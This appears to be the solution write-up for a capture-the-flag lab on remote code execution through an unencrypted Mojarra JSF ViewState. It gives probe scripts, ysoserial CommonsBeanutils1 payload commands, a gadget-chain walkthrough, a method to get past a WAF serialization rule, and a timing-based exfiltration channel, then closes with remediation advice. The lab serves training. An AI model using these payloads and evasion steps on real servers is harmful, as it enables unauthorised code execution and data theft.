# Solution

Spoilers ahead. Read the main README and try the lab first.

The lab is a Mojarra (JSF 2.2) application with client-side state saving and state
encryption disabled. The `javax.faces.ViewState` parameter is
`Base64(GZIP(Java serialization stream))`, and the server deserializes it with a plain
`ObjectInputStream` while restoring the view, before the login action runs. With
commons-beanutils and commons-collections on the classpath, a standard gadget chain gives
arbitrary command execution.

## Step 1 - inspect the view state

```
$ curl -s http://localhost:8080/pages/login.xhtml -o login.html

$ python3 - <<'EOF'
import re, gzip, base64
html = open('login.html', encoding='utf-8', errors='replace').read()
vs = re.search(r'name="javax\.faces\.ViewState"[^>]*value="([^"]+)"', html).group(1)
print('prefix:', vs[:16])
raw = base64.b64decode(vs)
print('gzip:', raw[:2] == b'\x1f\x8b')
data = gzip.decompress(raw)
print('serialized:', data[:2] == b'\xac\xed', '|', len(data), 'bytes')
print('first class:', data[data.find(b'\x73\x72'):][:20])
EOF
prefix: H4sIAAAAAAAAAFvz
gzip: True
serialized: True | 168 bytes
first class: b'sr\x00\x11java.util.HashMa'
```

No encryption, no MAC. The server accepts whatever the client sends back.

## Step 2 - prove the deserialization oracle

Before building any chain, prove that the server actually deserializes
attacker-controlled data. Send three deliberately broken ViewStates and read the
errors — `oracle.py` automates this:

```
$ python3 oracle.py
[*] target: http://localhost:8080/pages/login.xhtml
[+] probe A (non-gzip garbage)  -> HTTP 500 | Not in GZIP format
[+] probe B (truncated stream)  -> HTTP 500 | EOFException
[+] probe C (nonexistent class) -> HTTP 500 | ClassNotFoundException: com.evil.NoSuchClassXYZ
[+] all three probes reproduced the oracle
```

What each probe proves:

- **A**: the value is Base64-decoded and GZIP-decompressed by
  `ClientSideStateHelper.doGetState()` — a format-level parse of client data.
- **B**: after decompression the bytes go into
  `ObjectInputStream.readObject()` — an actual deserialization sink, not just
  a string being parsed.
- **C**: `readObject()` resolves class descriptors whose **name the attacker
  chose**. This is the primitive the whole exploit builds on: if we can name
  the classes, we can pick the gadget.

The full stack trace in every response ends in
`RestoreViewPhase.execute()` — the deserialization happens during view
restore, *before* the JSF lifecycle ever reaches the login action or the
captcha check. No credentials, no captcha, no CSRF token: the probes above
carry nothing but the ViewState parameter.

(The target also leaks verbose Java stack traces — part of the discovery
process: the error messages are what tell you which decode steps ran and in
what order.)

## Step 3 - the deserialization sink

Mojarra's `ClientSideStateHelper` decodes the parameter during `restoreView`, i.e. every
postback:

```
Base64 decode -> GZIP decompress -> ObjectInputStream.readObject()
```

The deserialization happens before the JSF lifecycle reaches the login action or the captcha
check, so no authentication is involved. Anything reachable from the classpath can be used
as a gadget.

The relevant dependencies:

```
commons-beanutils-1.9.2.jar
commons-collections-3.1.jar
```

## Step 4a - exploit with ysoserial

`ysoserial` has a chain for exactly this combination: `CommonsBeanutils1`.

```
$ java -jar ysoserial-all.jar CommonsBeanutils1 \
    "sh -c cat</flag.txt>/usr/local/tomcat/webapps/ROOT/out.txt" > payload.bin

$ python3 solve.py --raw payload.bin
[*] payload delivered, HTTP 500

$ curl -s http://localhost:8080/out.txt
flag{...}
```

Notes:

- `Runtime.exec(String)` in the gadget splits the command on whitespace and does not
  interpret quotes, which is why the command above avoids spaces:
  `sh -c cat</flag.txt>/usr/local/tomcat/webapps/ROOT/out.txt` tokenizes into
  `sh`, `-c` and `cat</flag.txt>/usr/...`. Shell redirections do the rest.
- `solve.py --raw` GZIPs and Base64-encodes the payload and posts it as
  `javax.faces.ViewState`.
- HTTP 500 is expected: the payload fires during deserialization and the request blows up
  right after. Command execution already happened.

## Step 4b - exploit with the included script

`solve.py` ships the same chain pre-built (`payload.template`:
PriorityQueue -> BeanComparator -> TemplatesImpl) so you do not need a Java
toolchain. The command is embedded in a fixed-length marker inside the translet
class and replaced in place; the constructor runs the command synchronously
(`exec` + `waitFor`), so the request returns only after the command finished.
The template is regenerated with `tools/build.sh` under JDK 8.

```
$ python3 solve.py
[*] payload delivered, HTTP 500
----------------------------------------------
flag{...}
----------------------------------------------

$ python3 solve.py 'id'
[*] payload delivered, HTTP 500
----------------------------------------------
uid=1001(portal) gid=1001(portal) groups=1001(portal)
----------------------------------------------
```

The command's output is redirected to a randomly named file under the deployed web
application directory and then fetched over HTTP, because the container has no outbound
network access. Deliveries that fail to produce output simply report that.

## Step 5 - verify

Self-check against the container (this is what the exercise forbids, use it only to confirm
your result after you have the flag over HTTP):

```
$ docker compose exec portal cat /flag.txt
```

The value must match what you recovered.

## How the chain works

1. `PriorityQueue.readObject()` re-heapifies its elements and calls the comparator.
2. `BeanComparator.compare()` reads the `outputProperties` property of both elements via
   `PropertyUtils`.
3. `TemplatesImpl.getOutputProperties()` calls `newTransformer()`, which lazily loads the
   attacker-supplied bytecode from `_bytecodes` with `defineClass()`.
4. The class is instantiated. Its constructor runs the shell command.
5. From there, the translet's command writes the flag under the web root; a normal HTTP GET
   reads it back.

The same primitive supports common variants: `CommonsCollections1` (commons-collections 3.1
is on the classpath too), `CommonsBeanutils1` with other bytecode, or any other chain that
fits the runtime. Everything depends on the libraries present, not on the ViewState itself.

## The WAF in front (the F5 ASM rule)

All traffic on port 8080 passes through `waf/waf.py`, a proxy that mimics the F5 ASM
device in front of the real target. Two fingerprints tell you a device is there:

- a BIG-IP style session cookie (`TSxxxx=...`) on HTML responses,
- and — the important one — a **403 Request Rejected** page when your payload trips
  its serialization rule.

The rule is the same one the real target enforced:

```
payload references com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
        + carries the STANDARD HotSpot serialVersionUID 0x09574fc16eacab33
        -> allowed
anything else                        -> blocked (403, java-serialization-signature)
```

Why this matters: gadget builders that **recompile** `TemplatesImpl` emit a custom
`serialVersionUID`, and those streams are rejected before Tomcat ever sees them.
Payloads that use the JDK's own class — like `ysoserial`, and like the `solve.py`
template — keep the standard SUID and pass. Flip one byte of the SUID in the template
and you get the block page instead of the usual HTTP 500.

The rule is deliberately narrow: it only inspects Base64+GZIP payloads that name
`TemplatesImpl`. The oracle probes from Step 2 contain no gadget class, so they flow
through untouched — the error oracle still works behind the WAF.

## Report-faithful timing mode

The real target filtered all egress (DNS sinkholed, outbound TCP intercepted), so the
report exfiltrated command output through the **HTTP response time** — each hex digit of
the output encoded as a `0.25s` sleep step, digits recovered by subtracting the baseline.
The lab can reproduce exactly that path:

```
$ TIMING_MODE=1 docker compose up -d --force-recreate

$ python3 timing_solver.py 'whoami'
[*] target : http://localhost:8080
[*] command: 'whoami'
[*] baseline 0.01s | +2s probe 2.01s (skew -0.00s)
[*] 10 digits so far: 706f727461
[*] output: 14 hex chars (7 bytes)
==============================================
portal
==============================================
```

What each piece does:

- `TIMING_MODE=1` makes the webroot **read-only**, so the file-drop path of
  Step 4b fails with `Permission denied` — output has nowhere to go but the
  response time. The webroot lock is the lab's way of forcing the channel the
  report used.
- `timing_solver.py` calibrates first: the median of five far-out probes is the
  `baseline`, then a `sleep 2` probe must come back at `baseline + 2s` (the
  `skew` line — proof the payload blocks, because the translet constructor runs
  `exec` + `waitFor`). Then every position of the hex output is probed
  individually: position *P* sleeps `N * 0.25s` where *N* is that hex digit,
  plus a `0.5s` in-range marker; a response at baseline means the end of the
  output.
- The payload constructor is synchronous (`tools/build.sh` regenerates it) —
  without `waitFor` the request would return before the sleeps and the channel
  would carry no information.

Control measurements you can take yourself, mirroring the report's:

```
$ python3 solve.py 'sleep 3; echo x'        # normal mode: response takes ~3s (waitFor proof)
$ python3 timing_solver.py 'id -u'          # -> 1001, i.e. NON-root (report: uid >= 1000)
$ python3 timing_solver.py 'hostname'
```

Switch back to normal mode with `docker compose up -d --force-recreate`
(`TIMING_MODE` defaults to `0`).

## Fixing the application

See the "Fixing it in real applications" section of the main README. Short version: use
server-side state saving, never disable state encryption, and keep gadget libraries off the
classpath.

## References

- Synacktiv, "JSF ViewState upside-down" — <https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf>
- Alphabot Security, "Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities" — <https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html>
- HackTricks, "Java JSF ViewState (.faces) Deserialization" — <https://hacktricks.wiki/en/pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization.html>
- ysoserial — <https://github.com/frohoff/ysoserial>
